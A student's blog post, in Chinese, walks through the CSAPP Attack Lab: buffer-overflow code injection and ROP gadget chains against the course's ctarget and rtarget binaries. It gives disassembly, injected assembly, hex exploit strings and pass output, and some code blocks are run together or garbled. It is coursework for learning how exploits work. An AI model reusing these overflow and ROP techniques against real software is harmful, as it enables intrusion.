@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	
+	<title>3wのblog  | CSAPP_AttackLab</title>
+	<meta name="viewport" content="width=device-width,minimum-scale=1">
+	<meta name="generator" content="Hugo 0.85.0" />
+	
+	
+	<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+	
+
+	
+	
+	<link href="/dist/app.css" rel="stylesheet">
+	
+
+	
+
+	
+	
+	
+
+	
+	
+	
+	
+	
+	<script>
+		(function (u, c) {
+			var d = document,
+				t = 'script',
+				o = d.createElement(t),
+				s = d.getElementsByTagName(t)[0];
+			o.src = u;
+			if (c) {
+				o.addEventListener('load', function (e) {
+					c(e);
+				});
+			}
+			s.parentNode.insertBefore(o, s);
+		})('https:\/\/weivwang.github.io\/lib\/pangu.min.js', function () {
+			pangu.spacingPage();
+		});
+	</script>
+	
+	
+	
+	<style type="text/css" media="screen, print">
+		@font-face {
+			font-family: "FancyTitleFont";
+			font-style: normal;
+			font-display: swap;
+			src: url('%25!s%28%3cnil%3e%29.woff2') format('woff2'),
+				url('%25!s%28%3cnil%3e%29.woff') format('woff');
+		}
+		 
+		  
+		 
+		@font-face {
+			font-family: 'Noto Serif CJK SC';
+			font-style: normal;
+			font-weight: 300;
+			font-display: swap;
+			src: local('Noto Serif CJK SC Light'), local('NotoSerifCJK-Light'),
+				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2') format('woff2'),
+				 
+				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff') format('woff');
+			 
+		}
+
+		 
+		@font-face {
+			font-family: 'Noto Serif CJK SC';
+			font-style: normal;
+			font-weight: 400;
+			font-display: swap;
+			src: local('Noto Serif CJK SC'), local('NotoSerifCJK-Regular'),
+				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2') format('woff2'),
+				 
+				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff') format('woff');
+			 
+		}
+
+		 
+		@font-face {
+			font-family: 'Noto Serif CJK SC';
+			font-style: normal;
+			font-weight: 500;
+			font-display: swap;
+			src: local('Noto Serif CJK SC Medium'), local('NotoSerifCJK-Medium'),
+				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2') format('woff2'),
+				 
+				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff') format('woff');
+			 
+		}
+	</style>
+	
+</head>
+
+<body class="bg-gray-100 text-gray-700 font-sans">
+	<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
+		<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
+			<div
+				class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
+				
+<div>
+	<h2>
+		<a href="https://weivwang.github.io" title="3wのblog" class="heading font-cursive icon">3wのblog</a>
+	</h2>
+</div>
+<h1 class="pt-2">CSAPP_AttackLab</h1>
+
+<div class="flex flex-wrap justify-end pt-2 "><div class="md:flex-grow-0 font-light">
+	
+
+	
+
+	
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
+		datetime="2021-11-15T14:39:54&#43;08:00">2021-11-15 14:39</time>
+</div>
+
+<hr />
+
+
+			</div>
+		</header>
+		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+			
+
+<article>
+	<section class="mx-auto content">
+		<div class="c-rich-text"><p>CSAPP_Attack</p>
+<p>要求进行五次攻击。攻击方式是code injection代码注入和Reeturn-oriented programming(ROP)</p>
+<p>参考资料：<!-- raw HTML omitted -->写的比较好的一个教程<!-- raw HTML omitted --></p>
+<h3 id="前置知识">前置知识</h3>
+<p><strong>Code Injection</strong>：</p>
+<p>通过使缓冲区溢出，注入攻击代码。这种情况是没有开启栈随机化（每一次执行，反汇编某个函数，会发现汇编代码的地址是固定的），同时没有开金丝雀防止栈溢出，反汇编也可以看到，没有%fs:40 之类的指令，而在bomblab里面读汇编代码会发现每一个函数都有金丝雀（也解决了当时做那一个实验的疑惑），如下：</p>
+<pre><code>    141f:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
+    1426:       00 00
+    1428:       48 89 44 24 08          mov    %rax,0x8(%rsp)
+    142d:       31 c0                   xor    %eax,%eax
+</code></pre><p>这里的fs是段基址，csapp教材上有讲，但是没细说。看王爽的《汇编语言》讲了这个概念，一般在8086机上会使用段偏移这种寻址方式，大致是：地址线有20位，但是寄存器只有16位，所以采用16bit段地址+4bit偏移量来进行寻址：物理地址 = 段地址*16 + 偏移地址。</p>
+<p>另一个弄懂的地方是：实际上内存大小是局限于地址总线的宽度的。因为地址总线的宽度代表了寻址的能力，而内存大小超过这个寻址范围，多出去的内存没用了，因为找不到。</p>
+<p>但是现在的x86-64的寻址能力理论上能达到1800万TB，而实际上目前做不出来这么大的内存，所以现在可以认为内存可以往高了加。</p>
+<p>扯开了，接着看上面的指令，先将段偏移赋给rax，接着通过rax定位rsp，这其实已经固定好了缓冲区的大小，最后一个xor异或指令意义在于：一旦用户输入数据溢出缓冲区，覆盖了金丝雀数，前后金丝雀数异或结果一定为1，设置某个标志位为1之后程序退出，这样就防止了缓冲区溢出的问题。</p>
+<p><strong>ROP</strong>：</p>
+<p>return-oriented programming
+ROP即使用你程序里的字节代码攻击你的程序。</p>
+<p>就是在开启栈空间随机化之后，每次初始化栈，栈里面放的是allocate函数，分配随机大小空间，实际的调用栈帧在这个随机空间之后，这样就实现了栈空间的随机化，那黑客拿不到这个栈地址，自然无法直接inject程序。</p>
+<p>但是也有方法：有些黑客用nop指令，nop将rip+4或+8， 不执行操作，这样总有一次能找到目标程序。但是现在随机的空间范围太大了，也不用这种方法了。</p>
+<p>另一种：用程序里面的代码攻击程序，这样就不用注入代码了，我用你程序本来的代码来当作我的指令，实现攻击。</p>
+<p><strong>Objdump</strong></p>
+<p><strong>GCC</strong></p>
+<p><strong>GDB</strong></p>
+<p>这几个也都是bomblab要用的</p>
+<h3 id="实验材料">实验材料</h3>
+<p><img src="https://i.loli.net/2021/11/17/KhJyFQzwINZgpe3.png" alt="image-20211117171611619"></p>
+<ul>
+<li>
+<p>cookie：存放通过关卡需要的字符串</p>
+</li>
+<li>
+<p>Ctarget：使用code injection方式进行攻击的程序</p>
+</li>
+<li>
+<p>Farm.c：感觉没什么用，已经被编译进rtarget里面了</p>
+</li>
+<li>
+<p>Hex2raw ：16进制转字符串</p>
+</li>
+<li>
+<p>Readme：学号等信息</p>
+</li>
+<li>
+<p>rtarget：使用ROP方式进行攻击</p>
+</li>
+</ul>
+<p><img src="https://i.loli.net/2021/11/17/dt9kUxI4rBf5TqM.png" alt="image-20211117173053423"></p>
+<p><img src="https://i.loli.net/2021/11/17/fs2FWva8PDBYwjg.png" alt="image-20211117173106212"></p>
+<p>Gets()是不安全的，没有限制读入的长度，容易导致缓冲区溢出</p>
+<p><img src="https://i.loli.net/2021/11/17/wbhmruZO4e6F5Nf.png" alt="image-20211117173229239"></p>
+<h3 id="touch1">touch1</h3>
+<pre><code>gdb ctarget
+</code></pre><pre><code>disas getbuf
+#输出：
+Dump of assembler code for function getbuf:
+   0x0000000000401796 &lt;+0&gt;:	sub    $0x38,%rsp
+   0x000000000040179a &lt;+4&gt;:	mov    %rsp,%rdi
+   0x000000000040179d &lt;+7&gt;:	callq  0x401a36 &lt;Gets&gt;
+   0x00000000004017a2 &lt;+12&gt;:	mov    $0x1,%eax
+   0x00000000004017a7 &lt;+17&gt;:	add    $0x38,%rsp
+   0x00000000004017ab &lt;+21&gt;:	retq   
+</code></pre><pre><code>disas touch1
+#输出：
+	 0x00000000004017ac &lt;+0&gt;:	sub    $0x8,%rsp
+   0x00000000004017b0 &lt;+4&gt;:	movl   $0x1,0x202d42(%rip)        # 0x6044fc &lt;vlevel&gt;
+   0x00000000004017ba &lt;+14&gt;:	lea    0x1968(%rip),%rdi        # 0x403129
+   0x00000000004017c1 &lt;+21&gt;:	callq  0x400c70 &lt;puts@plt&gt;
+   0x00000000004017c6 &lt;+26&gt;:	mov    $0x1,%edi
+   0x00000000004017cb &lt;+31&gt;:	callq  0x401ca6 &lt;validate&gt;
+   0x00000000004017d0 &lt;+36&gt;:	mov    $0x0,%edi
+   0x00000000004017d5 &lt;+41&gt;:	callq  0x400de0 &lt;exit@plt&gt;
+</code></pre><p>getbuf是不安全的，它建立0x38大小的缓冲区，希望读入0x38的数据，但是我们一旦输入的数据超过0x38，会将getbuf的返回地址覆盖。</p>
+<p>所以思路是，写满缓冲区，并将溢出部分（原本的返回地址）设置为touch1的地址，这样getbuf将直接返回到touch1</p>
+<p>touch1地址为0x00000000004017ac</p>
+<p>所以只需要将getbuf()函数返回地址修改为0x00000000004017ac，利用缓冲区溢出的原理</p>
+<p>新建输入文件level1.txt：</p>
+<pre><code>vim level1.txt
+</code></pre><p>填充内容：</p>
+<pre><code>00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 #填满缓冲区
+ac 17 40 00 00 00 00 00 #返回地址改为touch1
+</code></pre><p>注意，大部分机器采用小端法，数是反过来的</p>
+<pre><code>./hex2raw -i level1.txt | ./ctarget -q
+</code></pre><p>顺利通过</p>
+<pre><code>Cookie: 0x5fc1af14
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	2019302110426
+	course	15213-f15
+	lab	attacklab
+	result	251:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AC 17 40 00 00 00 00 00 
+
+</code></pre><h3 id="touch2">touch2</h3>
+<pre><code>disas touch2
+</code></pre><pre><code>	 0x00000000004017da &lt;+0&gt;:	sub    $0x8,%rsp
+   0x00000000004017de &lt;+4&gt;:	mov    %edi,%edx
+   0x00000000004017e0 &lt;+6&gt;:	movl   $0x2,0x202d12(%rip)        # 0x6044fc &lt;vlevel&gt;
+   0x00000000004017ea &lt;+16&gt;:	cmp    %edi,0x202d14(%rip)        # 0x604504 &lt;cookie&gt;
+   0x00000000004017f0 &lt;+22&gt;:	je     0x40181c &lt;touch2+66&gt;
+   0x00000000004017f2 &lt;+24&gt;:	lea    0x197f(%rip),%rsi        # 0x403178
+   0x00000000004017f9 &lt;+31&gt;:	mov    $0x1,%edi
+   0x00000000004017fe &lt;+36&gt;:	mov    $0x0,%eax
+   0x0000000000401803 &lt;+41&gt;:	callq  0x400d90 &lt;__printf_chk@plt&gt;
+   0x0000000000401808 &lt;+46&gt;:	mov    $0x2,%edi
+   0x000000000040180d &lt;+51&gt;:	callq  0x401d76 &lt;fail&gt;
+   0x0000000000401812 &lt;+56&gt;:	mov    $0x0,%edi
+   0x0000000000401817 &lt;+61&gt;:	callq  0x400de0 &lt;exit@plt&gt;
+   0x000000000040181c &lt;+66&gt;:	lea    0x192d(%rip),%rsi        # 0x403150
+   0x0000000000401823 &lt;+73&gt;:	mov    $0x1,%edi
+   0x0000000000401828 &lt;+78&gt;:	mov    $0x0,%eax
+   0x000000000040182d &lt;+83&gt;:	callq  0x400d90 &lt;__printf_chk@plt&gt;
+   0x0000000000401832 &lt;+88&gt;:	mov    $0x2,%edi
+   0x0000000000401837 &lt;+93&gt;:	callq  0x401ca6 &lt;validate&gt;
+   0x000000000040183c &lt;+98&gt;:	jmp    0x401812 &lt;touch2+56&gt;
+</code></pre><p>相比于touch1，touch2带参数，在touch2内部将参数与cookie值进行比较，若相等才能过关</p>
+<p>地址为：0x00000000004017da</p>
+<p>不能使用jmp或者call指令，所以将touch2地址压入栈，使用ret指令将touch2地址弹出，并设置为指令寄存器的值，因为touch2将输入的参数与cookie比较，所以把cookie值赋给第一个参数rdi</p>
+<p>注入代码：</p>
+<pre><code>vim inject.s
+</code></pre><pre><code>movq $0x5fc1af14, %rdi #将cookie赋给rdi寄存器，rdi存放函数第一个参数pushq $0x00000000004017da #压入touch2地址ret #弹出touch2地址，赋给rsi，这两步是为了跳转到touch2
+</code></pre><p>生成为.o文件：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc -c inject.s
+</code></pre></div><p>查看.o文件，从而获得可执行的指令序列</p>
+<pre><code>objdump -d inject.o
+</code></pre><p>输出：</p>
+<pre><code>Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 14 af c1 5f 	mov    $0x5fc1af14,%rdi
+   7:	68 da 17 40 00  	pushq  $0x4017da
+   e:	c3 
+</code></pre><p>所以这三条指令序列：</p>
+<pre><code>48 c7 c7 14 af c1 5f ff 34 25 da 17 40 00 c3 
+</code></pre><p>寻找getbuf的rsp地址，实现覆盖</p>
+<pre><code>gdb ctargetbreak getbufrun -qdisas
+</code></pre><p>disas输出：</p>
+<pre><code>(gdb) disas
+Dump of assembler code for function getbuf:
+=&gt; 0x0000000000401796 &lt;+0&gt;:	sub    $0x38,%rsp
+   0x000000000040179a &lt;+4&gt;:	mov    %rsp,%rdi
+   0x000000000040179d &lt;+7&gt;:	callq  0x401a36 &lt;Gets&gt;
+   0x00000000004017a2 &lt;+12&gt;:	mov    $0x1,%eax
+   0x00000000004017a7 &lt;+17&gt;:	add    $0x38,%rsp
+   0x00000000004017ab &lt;+21&gt;:	retq   
+</code></pre><pre><code>stepi
+</code></pre><p>查看rsp值</p>
+<pre><code>p/x $rsp
+</code></pre><pre><code>$1 = 0x55660a78 
+</code></pre><p>touch2地址：0x55660a78</p>
+<p>getbuf和第一关大小一样，都是0x38</p>
+<pre><code>vim level2.txt
+</code></pre><pre><code>48 c7 c7 14 af c1 5f 68 
+da 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 0a 66 55 00 00 00 00
+</code></pre><pre><code>./hex2raw -i level2.txt | ./ctarget -q
+</code></pre><p>./hex2raw -i level5.txt | ./rtarget -q</p>
+<p>0x55660ab0</p>
+<p>0x55660a78</p>
+<h3 id="touch3">touch3</h3>
+<p><img src="https://i.loli.net/2021/11/17/Hdx8wkiRSQFCEZp.png" alt="image-20211117174559398"></p>
+<p>![image-20211117174622704](/Users/wangweiwei/Library/Application Support/typora-user-images/image-20211117174622704.png)</p>
+<pre><code>disas touch3
+</code></pre><pre><code>   0x00000000004018f1 &lt;+0&gt;:	push   %rbx   0x00000000004018f2 &lt;+1&gt;:	mov    %rdi,%rbx   0x00000000004018f5 &lt;+4&gt;:	movl   $0x3,0x202bfd(%rip)        # 0x6044fc &lt;vlevel&gt;   0x00000000004018ff &lt;+14&gt;:	mov    %rdi,%rsi   0x0000000000401902 &lt;+17&gt;:	mov    0x202bfc(%rip),%edi        # 0x604504 &lt;cookie&gt;   0x0000000000401908 &lt;+23&gt;:	callq  0x40183e &lt;hexmatch&gt;   0x000000000040190d &lt;+28&gt;:	test   %eax,%eax   0x000000000040190f &lt;+30&gt;:	je     0x40193e &lt;touch3+77&gt;   0x0000000000401911 &lt;+32&gt;:	mov    %rbx,%rdx   0x0000000000401914 &lt;+35&gt;:	lea    0x1885(%rip),%rsi        # 0x4031a0   0x000000000040191b &lt;+42&gt;:	mov    $0x1,%edi   0x0000000000401920 &lt;+47&gt;:	mov    $0x0,%eax   0x0000000000401925 &lt;+52&gt;:	callq  0x400d90 &lt;__printf_chk@plt&gt;   0x000000000040192a &lt;+57&gt;:	mov    $0x3,%edi   0x000000000040192f &lt;+62&gt;:	callq  0x401ca6 &lt;validate&gt;   0x0000000000401934 &lt;+67&gt;:	mov    $0x0,%edi   0x0000000000401939 &lt;+72&gt;:	callq  0x400de0 &lt;exit@plt&gt;   0x000000000040193e &lt;+77&gt;:	mov    %rbx,%rdx   0x0000000000401941 &lt;+80&gt;:	lea    0x1880(%rip),%rsi        # 0x4031c8   0x0000000000401948 &lt;+87&gt;:	mov    $0x1,%edi
+</code></pre><pre><code> 0x00000000004018f1 &lt;+0&gt;:	push   %rbx
+   0x00000000004018f2 &lt;+1&gt;:	mov    %rdi,%rbx
+   0x00000000004018f5 &lt;+4&gt;:	movl   $0x3,0x202bfd(%rip)        # 0x6044fc &lt;vlevel&gt;
+   0x00000000004018ff &lt;+14&gt;:	mov    %rdi,%rsi
+   0x0000000000401902 &lt;+17&gt;:	mov    0x202bfc(%rip),%edi        # 0x604504 &lt;cookie&gt;
+   0x0000000000401908 &lt;+23&gt;:	callq  0x40183e &lt;hexmatch&gt;
+   0x000000000040190d &lt;+28&gt;:	test   %eax,%eax
+   0x000000000040190f &lt;+30&gt;:	je     0x40193e &lt;touch3+77&gt;
+   0x0000000000401911 &lt;+32&gt;:	mov    %rbx,%rdx
+   0x0000000000401914 &lt;+35&gt;:	lea    0x1885(%rip),%rsi        # 0x4031a0
+   0x000000000040191b &lt;+42&gt;:	mov    $0x1,%edi
+   0x0000000000401920 &lt;+47&gt;:	mov    $0x0,%eax
+   0x0000000000401925 &lt;+52&gt;:	callq  0x400d90 &lt;__printf_chk@plt&gt;
+   0x000000000040192a &lt;+57&gt;:	mov    $0x3,%edi
+   0x000000000040192f &lt;+62&gt;:	callq  0x401ca6 &lt;validate&gt;
+   0x0000000000401934 &lt;+67&gt;:	mov    $0x0,%edi
+   0x0000000000401939 &lt;+72&gt;:	callq  0x400de0 &lt;exit@plt&gt;
+   0x000000000040193e &lt;+77&gt;:	mov    %rbx,%rdx
+   0x0000000000401941 &lt;+80&gt;:	lea    0x1880(%rip),%rsi        # 0x4031c8
+   0x0000000000401948 &lt;+87&gt;:	mov    $0x1,%edi
+</code></pre><pre><code class="language-undefined" data-lang="undefined">./hex2raw -i level3.txt | ./ctarget -q
+</code></pre><pre><code>48 c7 c7 b8 0a 66 55 68 
+f1 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 0a 66 55 00 00 00 00
+35 66 63 31 61 66 31 34
+00
+</code></pre><p>Mov cookie地址 rdi</p>
+<p>pop touch3</p>
+<p>ret</p>
+<p>关于cookie字符数组存放的位置：</p>
+<p><img src="https://i.loli.net/2021/11/17/rZH1G8gwYXABLCk.png" alt="image-20211117174844978"></p>
+<p>cookie需要以0结尾：</p>
+<p><img src="https://i.loli.net/2021/11/17/buo9BYfIeRyDExd.png" alt="image-20211117174941581"></p>
+<h3 id="rop-touch2">ROP touch2</h3>
+<ol>
+<li>开启了栈随机化,栈的位置在程序每次运行时都有变化，难以预测攻击字符串的位置（空操作雪橇<code>nop sled</code>可暴力枚举,太庞大）</li>
+<li>栈空间不允许有可执行指令，限制了可执行代码区域</li>
+</ol>
+<pre><code>Mov4019c5:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)4019c5 + 2 = 4019c7Pop401994:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax401994 + 2 = 401996
+</code></pre><p>00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+96 02 00 00 00 00 00 00 # pop rax , 将返回地址变为getgad1
+14 af c1 5f 00 00 00 00 # cookie值，其实是执行 set rax = cookie
+37 00 00 00 00 00 00 00 # mov rax rdi
+da 17 40 00 00 00 00 00</p>
+<h3 id="rop-touch3">ROP touch3</h3>
+<p>mov    %rsp,%rax</p>
+<p>401a00:	8d 87 48 89 e0 94    	lea    -0x6b1f76b8(%rdi),%eax</p>
+<p>401a00 + 2 = 401a02</p>
+<p>add    $0x20,%rax</p>
+<p>4019d2:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</p>
+<p>4019d2 + 2 = 4019d4</p>
+<p>48 89 c7 :</p>
+<p>4019a2:	8d 87 48 89 c7 92    	lea    -0x6d3876b8(%rdi),%eax</p>
+<p>4019a2 + 2 = 4019a4</p>
+<p>0x00000000004018f1</p>
+<pre><code>0:	48 89 e0             	  mov    %rsp,%rax   3:	04 37               	add    $0x37,%rax   5:	48 89 c7             	mov    %rax,%rdi
+</code></pre><pre><code>00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0084 1a 40 00 00 00 00 00 #gadget1d4 19 40 00 00 00 00 00 #gadvget29e 19 40 00 00 00 00 00 #gadget3f1 18 40 00 00 00 00 00 #touch300 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 0035 66 63 31 61 66 31 3400
+</code></pre><p>movq %rsp,%rax  : 48 89 e0</p>
+<p>add $0x20,%al #$常数为偏移量，暂时未定 : 04 xx</p>
+<p>movq %rax,%rdi</p>
+<p><img src="https://i.loli.net/2021/11/15/1pcX5D9JeAtTLUy.png" alt="image-20211115110336875"></p>
+<p>401a84 是gedget1，让rsp = rax</p>
+<p><img src="https://i.loli.net/2021/11/15/v19IO5bNXEJnTDW.png" alt="image-20211115110905570"></p>
+<p>40 19 d4</p>
+<p><img src="https://i.loli.net/2021/11/15/YKIa62Pd5gSWfrN.png" alt="image-20211115111041884"></p>
+<p>40 19 9e</p>
+<pre><code>./hex2raw -i level5.txt | ./rtarget -q
+</code></pre><h3 id="让我心累的点新的发现">让我心累的点&amp;新的发现</h3>
+<p>我采用网上教程，过touch2和touch3的时候，方法绝对没错，但是永远过不了。和同学讨论过后，确认我的步骤绝对没错，我开始怀疑给的程序是有bug的。</p>
+<p>于是在IDA上反汇编动态调试（和室友一起），我的docker端口映射有问题，没办法动态调试。发现：当GET()到我的touch2地址时，由于我倒霉，地址里面有0a，读到这一位之后不读了，看get的代码，发现程序读到10（0x0a）时，果然会break。其实想一想也能理解，因为0a是换行符啊！！！</p>
+<p>所以我修改了程序的源代码，0a的时候不break，果然本地通过，</p>
+<p><img src="https://i.loli.net/2021/11/23/PRqgUvxEkfVHGpr.png" alt="image-20211123153846353"></p>
+<p>但是课程网站上是invalid，果然，网站为了防止我们作弊（修改原代码过程序/直接伪造请求），不能允许我们这样做。</p>
+<p>那咋办了，只能让地址里面不包含0a了，于是打算使用数据将0axx的栈空间全部占满，直接把指令存在test函数的栈帧中：除了写的0特别多，看到👀疼，终于过了。。。</p>
+<p>同样的方法过了touch3</p>
+<p>答案是这样的：</p>
+<p><img src="https://i.loli.net/2021/11/23/GiXE9PFzsmeBCwO.png" alt="image-20211123154424623"></p>
+<p>为了造出这个地址，补了非常多0</p>
+<p>实际上进了test栈帧</p>
+<p>那一天本来晚上6点去验收，自己预估10分钟就能弄完，也没吃饭，想着验收完了美美吃一顿，结果因为这个问题一直弄到晚上10:30，最后解决了吃了碗泡面。。。。</p>
+<p>关键是别的同学都没这个问题，我正好随到这个地址，当时觉得自己特别倒霉，现在想想其实还好。</p>
+<p>开辟出了一种新的方法，也对这个攻击的了解更加深刻了。</p>
+</div>
+	</section>
+
+
+</article>
+
+		</main>
+		<div class="w-full h-0 flex-none order-3"></div>
+		<aside role="contentinfo"
+			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+				
+	<div class="md:max-w-xs  flex flex-col md:items-end">
+	<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
+	
+	
+	<li class="px-1 md:px-0">
+		<a href="/liferecord/" title="LifeRecord page" >
+			LifeRecord
+		</a>
+	</li>
+	
+	<li class="px-1 md:px-0">
+		<a href="/studynotes/" title="StudyNotes page" 
+			class="font-medium text-medium-red-violet-600 hover:text-medium-red-violet-400" >
+			StudyNotes
+		</a>
+	</li>
+	
+	<li class="px-1 md:px-0">
+		<a href="/techthinking/" title="TechThinking page" >
+			TechThinking
+		</a>
+	</li>
+	
+	<li class="px-1 md:px-0">
+		<a href="/readpapers/" title="ReadPapers page" >
+			ReadPapers
+		</a>
+	</li>
+	
+	<li class="px-1 md:px-0">
+		<a href="/literatureart/" title="Literature&amp;Art page" >
+			Literature&amp;Art
+		</a>
+	</li>
+	
+	
+	
+	
+</ul>
+	
+
+<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start   max-h-16">
+	
+	<a href='https://github.com/weivwang' target="_blank" class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel="noopener"
+		aria-label="follow on github——Opens in a new window">
+		
+		<div class="fill-current h-8 w-8">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <g>
+        <path fill="none" d="M0 0h24v24H0z"/>
+        <path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32 0 0 1-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 0 1 .676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 0 1 .63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731 0 0 1 12 3.315c.912 0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 0 1 .616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293 0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492 0 0 1-.012 2.716 1 1 0 0 1-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998 0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66 0-.955-.312-1.744-.913-2.404a1 1 0 0 1-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 0 1-.833.135A9.626 9.626 0 0 0 12 5.315c-.89 0-1.772.119-2.592.35a1 1 0 0 1-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 0 1-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 0 1-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/>
+    </g>
+</svg>
+
+		</div>
+	</a>
+	
+</div>
+	<div class="text-sm text-gray-500 leading-tight a-gray">
+		
+		<br />
+		Built with Hugo and theme <a href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>. 1255 words in this page.
+	</div>
+</div>
+
+			</div>
+		</aside>
+		<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
+			
+<hr class="double-line" />
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+    
+    <a class="flex-grow-0" href="/techthinking/business_model_canvas/">
+        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
+            height="24">
+            <path fill="none" d="M0 0h24v24H0z" />
+            <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
+        Business_model_canvas
+    </a>
+    
+    
+    <a class="flex-grow-0" href="/studynotes/%E5%95%86%E5%8A%A1%E6%99%BA%E8%83%BD%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/">
+        商务智能课堂笔记
+        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
+            height="24">
+            <path fill="none" d="M0 0h24v24H0z" />
+            <path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z" /></svg></a>
+    
+</div>
+<div >
+
+
+
+</div>
+<hr />
+<div class="pb-2">
+    
+</div>
+<hr />
+
+		</footer>
+		
+
+<script src="/dist/app.js"></script>
+
+
+	</div>
+</body>
+
+</html>
